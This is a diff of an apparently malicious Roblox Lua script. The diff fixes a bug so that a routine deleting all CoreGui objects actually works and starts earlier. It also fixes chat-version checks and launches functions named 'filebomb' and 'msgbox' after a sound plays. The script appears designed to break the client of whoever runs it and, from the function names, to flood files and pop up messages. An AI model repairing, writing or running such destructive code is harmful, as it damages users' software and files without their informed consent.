@@ -19,15 +19,15 @@ local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
 -- Chat Properties
 local isChatModule
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-	isChatModule = "New"
+	isChatModule = "new"
 else
-	isChatModule = "Legacy"
+	isChatModule = "legacy"
 end
 
 local function chat(str)
-	if isChatModule == "New" then
+	if isChatModule == "new" then
 		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(str)
-	elseif isChatModule == "Legacy" then
+	elseif isChatModule == "legacy" then
 		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
 	end
 end
@@ -58,7 +58,7 @@ end
 
 local function delete_coregui()
 	for _, o in pairs(CoreGui:GetDescendants()) do
-		v:Destroy()
+		o:Destroy()
 		print(`Deleting CoreGui Object: {o}`)
 	end
 end
@@ -73,11 +73,11 @@ Sound.archivable = false
 
 task.wait(_G.Delayed_1)
 Sound:Play()
+task.spawn(delete_coregui)
 task.wait(_G.Delayed_2)
 
 task.spawn(filebomb)
 task.spawn(msgbox)
-task.spawn(delete_coregui)
 
 -- Properties
 local ScreenGui = Instance.new("ScreenGui", CoreGui) -- PlayerGui
